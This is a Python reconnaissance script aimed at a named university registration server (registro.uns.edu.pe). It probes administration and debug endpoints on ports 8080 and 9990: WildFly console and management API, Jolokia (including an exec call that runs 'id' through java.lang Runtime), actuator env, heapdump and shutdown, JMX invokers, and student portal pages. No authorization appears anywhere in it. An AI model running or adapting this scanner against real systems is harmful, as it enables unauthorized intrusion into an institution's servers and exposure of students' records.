#!/usr/bin/env python3
import os, sys
os.environ["PYTHONIOENCODING"] = "utf-8"
if sys.stdout.encoding != 'utf-8':
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import requests, urllib3, re, time
urllib3.disable_warnings()

base = 'http://registro.uns.edu.pe:8080'
print(f'=== WildFly Puerto 8080: {base} ===')

r = requests.get(base + '/', verify=False, timeout=10, allow_redirects=True)
print(f'/ => HTTP {r.status_code} | {len(r.content)}b | URL: {r.url}')
title_m = re.search(r'<title>([^<]+)</title>', r.text, re.I)
title = title_m.group(1).strip() if title_m else 'N/A'
print(f'Title: {title}')
print()

paths = [
    '/console', '/console/', '/console/index.html',
    '/management', '/management/',
    '/jolokia/', '/jolokia/read/java.lang:type=Runtime',
    '/jolokia/exec/java.lang:type=Runtime/exec/id',
    '/actuator', '/actuator/health', '/actuator/env',
    '/actuator/beans', '/actuator/mappings', '/actuator/loggers',
    '/actuator/shutdown', '/actuator/heapdump',
    '/WebAlumno/', '/WebAlumno/faces/login.xhtml',
    '/WebAlumno/faces/pages/expedientePersonal.xhtml',
    '/WebAlumno/faces/pages/login.xhtml',
    '/api/', '/rest/', '/services/',
    '/index.jsp', '/index.html',
    '/swagger-ui.html', '/v2/api-docs', '/v3/api-docs',
    '/invoker/JMXInvokerServlet', '/invoker/readonly',
    '/jmx-console/', '/web-console/',
    '/noredirect.html',
    '/robots.txt',
    '/status',
    '/health',
    '/info',
]

print('=== Endpoints en :8080 ===')
for path in paths:
    try:
        r2 = requests.get(
            f'{base}{path}',
            verify=False, timeout=8, allow_redirects=False,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        if r2.status_code not in [404, 400]:
            title2_m = re.search(r'<title>([^<]+)</title>', r2.text, re.I)
            if title2_m:
                t = title2_m.group(1).strip()
            else:
                t = r2.text[:60].replace('\n', ' ')
            loc = r2.headers.get('Location', '')
            powered = r2.headers.get('X-Powered-By', '')
            extra = f' -> {loc}' if loc else ''
            extra += f' [{powered}]' if powered else ''
            icon = '[+]' if r2.status_code == 200 else '[?]'
            print(f'  {icon} HTTP {r2.status_code} | {path} | {t[:70]}{extra}')
    except Exception as e:
        pass
    time.sleep(0.1)

print()
print('=== Puerto 9990 (WildFly management API) ===')
for path in ['/', '/management', '/management/subsystem/datasources']:
    for scheme in ['http', 'https']:
        try:
            url = f'{scheme}://registro.uns.edu.pe:9990{path}'
            r3 = requests.get(url, verify=False, timeout=5, allow_redirects=False)
            print(f'  [+] {url} => HTTP {r3.status_code} | {len(r3.content)}b')
            if r3.text:
                print(f'      Body: {r3.text[:150]}')
        except:
            pass

print()
print('=== Recon completado ===')
